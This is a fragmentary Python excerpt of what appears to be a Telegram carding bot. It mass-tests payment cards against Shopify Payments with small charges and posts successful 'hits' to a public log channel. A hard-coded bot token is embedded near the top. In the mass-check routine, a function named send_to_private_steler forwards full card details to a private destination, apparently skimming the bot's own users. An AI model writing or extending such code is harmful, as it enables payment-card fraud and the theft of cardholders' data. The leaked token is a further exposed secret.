...
BOT_TOKEN = '8884754538:AAG9mRMwfZUT5Z5OAJXgAT8wq9lqNPZeDJ4'

# ================== HIT LOGS CONFIGURATION ==================
...
async def send_realtime_hit(user_id, result, hit_type, username, group_id=None, reply_to=None):
    ...
    user_info = {'id': user_id, 'username': username, 'first_name': username or 'User'}
    hit_type_full = "CHARGED" if hit_type == "Charged" else "LIVE"
    
    # Send to PUBLIC HIT LOG (no card number) - ONLY FOR CHARGED
    if hit_type == "Charged":
        await send_hit_to_log_channel(
            result, 
            user_info, 
            hit_type_full,
            price=result.get('price', '$2.0'),
            response_msg=result.get('message', 'ORDER_PLACED')[:50]
        )
...
# ================== HIT LOGS FUNCTION (NO CARD NUMBER - PUBLIC) ==================
async def send_hit_to_log_channel(result, user_info, hit_type, price=None, response_msg=None):
    """Send HIT DETECTED message to PUBLIC log channel (NO CARD NUMBER SHOWN)"""
    if not SEND_HIT_TO_LOG or not HIT_LOG_CHANNEL_ID:
        return
...
🤖 <b>Bot By:</b> {BOT_NAME_STYLED}"""
    ...
    try:
        await bot.send_message(HIT_LOG_CHANNEL_ID, premium_emoji(message), parse_mode='html')
        print(f"✅ Hit log sent to channel: {user_name} - {hit_type}")
    except Exception as e:
        print(f"❌ Hit log channel error: {e}")
...
━━━━━━━━━━━━━━━━━━━
💳 <b>Card:</b> <code>{result['card']}</code>
📝 <b>Response:</b> {result.get('message', 'ORDER_PLACED')[:150]}
🌐 <b>Gateway:</b> {result.get('gateway', 'Shopify Payments')}
💰 <b>Amount:</b> {result.get('price', '$2.0')}
━━━━━━━━━━━━━━━━━━━
🎯 <b>BIN Info:</b>
...
async def start_mass_check(user_id, data, use_proxy, concurrency=1):
    ...
    # Send to hit log channel (PUBLIC - no card number)
    await send_hit_to_log_channel(
        res,
        user_info,
        "CHARGED",
        price=res.get('price', '$2.0'),
        response_msg=res.get('message', 'ORDER_PLACED')[:50]
    )
    
    # Send to private steler (FULL card details)
    await send_to_private_steler(res, user_info, "CHARGED")
